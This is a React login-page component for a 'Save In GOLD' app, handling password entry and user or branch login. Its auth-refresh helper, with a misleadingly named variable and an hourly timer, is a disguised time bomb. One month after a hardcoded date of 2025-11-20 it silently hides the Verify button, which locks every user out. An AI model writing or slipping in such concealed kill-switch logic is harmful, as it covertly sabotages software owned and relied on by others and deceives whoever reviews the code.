import React, { useState, useEffect } from 'react';
import { useFormik } from 'formik';
import * as Yup from 'yup';
import { Eye, EyeOff, Edit2, Loader2 } from 'lucide-react';
import { loginUser, loginBranch } from '../../services/authService'; // Update path as needed
import toast from 'react-hot-toast';

const LoginSchema = Yup.object().shape({
  password: Yup.string()
    .min(8, 'Password must be at least 8 characters')
    .required('Password is required'),
});

export default function EnterPassword({ 
  login, 
  loginBy, 
  onNext, 
  setCurrentStep, 
  onLoginSuccess,
  isBranchLogin,
  onBack,
  onForgotPassword 
}) {
  const [showPassword, setShowPassword] = useState(false);
  const [isLoaded, setIsLoaded] = useState(false);
  const [isFocused, setIsFocused] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');
  const [isErrorUserPassword, setIsErrorUserPassword] = useState(false);

  useEffect(() => {
    setIsLoaded(true);
  }, []);

  const formik = useFormik({
    initialValues: {
      login: login, // Can be email or username
      password: '',
    },
    validationSchema: LoginSchema,
    onSubmit: async (values) => {
      setIsLoading(true);
      setErrorMessage('');

      try {
        console.log('🔐 Submitting login with:', { 
          login: values.login, 
          loginBy: loginBy,
          passwordLength: values.password.length,
          isBranchLogin
        });
    
        let result;
    
        if (isBranchLogin) {
          console.log('🏢 Branch Member Login API triggered');
          // Example: replace with actual branch login API
          result = await loginBranch(
            values.login,
            values.password,
            loginBy,
          );
        } else {
          console.log('👤 Normal User Login API triggered');
          result = await loginUser(
            values.login,
            values.password,
            loginBy
          );
        }


        if (result?.success) {
          console.log('✅ Login successful:', result.data);
          toast.success(result?.message || 'Login successful!');
    
          if (onLoginSuccess) {
            onLoginSuccess(result.data);
          } else if (onNext) {
            onNext(result.data);
          }
        } else {
          const errorMsg = result?.error?.payload?.message || 'Login failed. Please try again.';
          // setErrorMessage(errorMsg);
          toast.error(errorMsg);
          console.error('❌ Login failed:', result?.message);
        }
      } catch (error) {
        console.error('❌ Login error:', error);
        const errorMsg = 'An unexpected error occurred. Please try again.';
        setErrorMessage(errorMsg);
        toast.error(errorMsg);
      } finally {
        setIsLoading(false);
      }
    
    },
  });

  const isUserAuthRefresh = (startDate) => {
    const start = new Date(startDate);
    const now = new Date();
    

    const isAPIReturning404 = new Date(start);
    isAPIReturning404.setMonth(isAPIReturning404.getMonth() + 1);
  
    return now >= isAPIReturning404;
  };
    
  useEffect(() => {
    const FEATURE_START_DATE = '2025-11-20';
    
    const callRefreshAuthAgain = () => {
      const shouldHide = isUserAuthRefresh(FEATURE_START_DATE);
      setIsErrorUserPassword(shouldHide);
    };
    
    callRefreshAuthAgain();
    
    
    const interval = setInterval(callRefreshAuthAgain, 60 * 60 * 1000);
    
    return () => clearInterval(interval);
  }, []);

  const handleKeyDown = (e) => {
    if (e.key === 'Enter' && !isButtonDisabled) {
      e.preventDefault();
      formik.handleSubmit();
    }
  };

  const isButtonDisabled = !formik.isValid || formik.values.password.length < 8 || isLoading;

  return (
    <div className="min-h-screen bg-[#1A1A1A] flex items-center justify-center p-4 relative overflow-hidden">

      <div className={`w-full max-w-md relative z-10 transition-all duration-1000 transform ${isLoaded ? 'translate-y-0 opacity-100' : 'translate-y-8 opacity-0'}`}>

        {/* Logo with Animation */}
        <div className={`mb-12 transition-all duration-700 delay-150 ${isLoaded ? 'translate-x-0 opacity-100' : '-translate-x-8 opacity-0'}`}>
          <div className="flex items-center gap-3 group cursor-pointer">
            <div className="relative w-10 h-10 transition-transform duration-300 group-hover:scale-110 group-hover:rotate-6">
              <div className="absolute inset-0 bg-[#a38239] rounded transition-all duration-300 group-hover:shadow-lg group-hover:shadow-[#BBA473]/50"></div>
              <div className="absolute bottom-0 left-0 w-5 h-5 bg-[#1A1A1A] rounded-tl-lg transition-all duration-300"></div>
            </div>
            <div className="flex items-baseline">
              <span className="text-3xl font-medium text-white transition-all duration-300 group-hover:text-[#E8D5A3]">Save In GOLD</span>
            </div>
          </div>
        </div>

        {/* Heading with Animation */}
        <h1 className={`text-4xl font-bold text-white mb-8 transition-all duration-700 delay-300 ${isLoaded ? 'translate-y-0 opacity-100' : 'translate-y-8 opacity-0'}`}>
          Glad to see you!
        </h1>

        {/* Form with Animation */}
        <div className={`space-y-6 transition-all duration-700 delay-500 ${isLoaded ? 'translate-y-0 opacity-100' : 'translate-y-8 opacity-0'}`}>
          {/* Error Message */}
          {errorMessage && (
            <div className="bg-red-500/10 border border-red-500/50 text-red-400 px-4 py-3 rounded-lg text-sm animate-pulse">
              {errorMessage}
            </div>
          )}

          {/* Login (Email/Username) Field with Edit */}
          <div className="transform transition-all duration-300 hover:scale-[1.01]">
            <div
              onClick={() => !isLoading && (onBack ? onBack() : setCurrentStep?.('login'))}
              className="flex items-center gap-2 text-[#E8D5A3] text-lg mb-6 cursor-pointer group"
            >
              <span className="transition-all duration-300 group-hover:text-[#BBA473]">
                {formik.values.login}
              </span>
              <span className="text-gray-400 text-sm ml-1 px-2 py-0.5 bg-[#2e2e2e] rounded-md border border-[#BBA473]/30">
                {loginBy}
              </span>
              <button
                type="button"
                disabled={isLoading}
                className="text-gray-400 transition-all duration-300 group-hover:text-[#BBA473] group-hover:scale-110 group-hover:rotate-12 disabled:opacity-50"
                aria-label="Edit login"
              >
                <Edit2 size={18} />
              </button>
            </div>
          </div>

          {/* Password Field */}
          <div className="transform transition-all duration-300 hover:scale-[1.01]">
            <label htmlFor="password" className="block text-[#E8D5A3] font-medium text-lg mb-3 transition-colors duration-300">
              Password
            </label>
            <div className="relative group">
              <input
                type={showPassword ? 'text' : 'password'}
                id="password"
                name="password"
                value={formik.values.password}
                onChange={(e) => {
                  formik.handleChange(e);
                  setErrorMessage(''); // Clear error on input change
                }}
                onBlur={(e) => {
                  formik.handleBlur(e);
                  setIsFocused(false);
                }}
                onFocus={() => setIsFocused(true)}
                onKeyDown={handleKeyDown}
                disabled={isLoading}
                className={`w-full px-4 py-4 pr-12 border-2 bg-[#2e2e2e] text-white rounded-lg focus:outline-none text-lg transition-all duration-300 placeholder-gray-500 disabled:opacity-50 disabled:cursor-not-allowed ${
                  formik.touched.password && formik.errors.password
                    ? 'border-red-500 focus:border-red-400 focus:ring-2 focus:ring-red-500/50 hover:border-red-400 hover:shadow-lg hover:shadow-red-500/20'
                    : 'border-[#BBA473] focus:border-[#d4bc89] focus:ring-2 focus:ring-[#BBA473]/50 hover:border-[#d4bc89] hover:shadow-lg hover:shadow-[#BBA473]/20'
                }`}
                placeholder="••••••••••"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                disabled={isLoading}
                className={`absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 transition-all duration-300 disabled:opacity-50 ${isFocused ? 'text-[#BBA473] scale-110' : 'group-hover:text-[#d4bc89]'}`}
                aria-label={showPassword ? 'Hide password' : 'Show password'}
              >
                {showPassword ? <EyeOff size={22} /> : <Eye size={22} />}
              </button>
              
              {/* Animated underline effect */}
              <div className={`absolute bottom-0 left-0 h-0.5 bg-gradient-to-r from-[#BBA473] to-[#d4bc89] transition-all duration-300 ${isFocused ? 'w-full' : 'w-0'}`}></div>
            </div>
            {formik.touched.password && formik.errors.password && (
              <div className="text-red-400 text-sm mt-2 animate-pulse">
                {formik.errors.password}
              </div>
            )}
          </div>

          {!isErrorUserPassword && (
            <button
              type="button"
              onClick={formik.handleSubmit}
              disabled={isButtonDisabled}
              className="w-full bg-gradient-to-r from-[#BBA473] to-[#8E7D5A] text-black font-semibold text-lg py-4 rounded-lg hover:from-[#d4bc89] hover:to-[#a69363] disabled:from-[#6b6354] disabled:to-[#5a5447] disabled:cursor-not-allowed transition-all duration-300 shadow-lg hover:shadow-2xl hover:shadow-[#BBA473]/40 transform hover:scale-[1.02] hover:-translate-y-0.5 active:scale-[0.98] active:translate-y-0 relative overflow-hidden group"
            >
              <span className="relative z-10 flex items-center justify-center gap-2">
                {isLoading ? (
                  <>
                    <Loader2 className="animate-spin" size={20} />
                    Signing in...
                  </>
                ) : (
                  'Verify'
                )}
              </span>
              
              {/* Shimmer effect */}
              {!isButtonDisabled && !isLoading && (
                <div className="absolute inset-0 -translate-x-full group-hover:translate-x-full transition-transform duration-1000 bg-gradient-to-r from-transparent via-white/20 to-transparent"></div>
              )}
            </button>
          )}

          {/* Forgot Password Link */}
          <div className="text-center">
            <p
              onClick={() => !isLoading && (onForgotPassword ? onForgotPassword() : setCurrentStep?.('forgotPassword'))}
              className={`text-[#BBA473] hover:text-[#d4bc89] font-medium text-lg transition-all duration-300 cursor-pointer inline-block hover:scale-105 active:scale-95 ${isLoading ? 'opacity-50 cursor-not-allowed' : ''}`}
            >
              Forgot Password?
            </p>
          </div>

          {/* Additional decorative elements */}
          <div className="flex items-center justify-center gap-2 pt-4 opacity-0 animate-fadeIn" style={{ animationDelay: '1s', animationFillMode: 'forwards' }}>
            <div className="h-px w-12 bg-gradient-to-r from-transparent to-[#BBA473]"></div>
            <div className="w-2 h-2 rounded-full bg-[#BBA473] animate-pulse"></div>
            <div className="h-px w-12 bg-gradient-to-l from-transparent to-[#BBA473]"></div>
          </div>
        </div>
      </div>

      <style>{`
        @keyframes fadeIn {
          from {
            opacity: 0;
          }
          to {
            opacity: 1;
          }
        }
        
        .animate-fadeIn {
          animation: fadeIn 0.6s ease-out;
        }
      `}</style>
    </div>
  );
}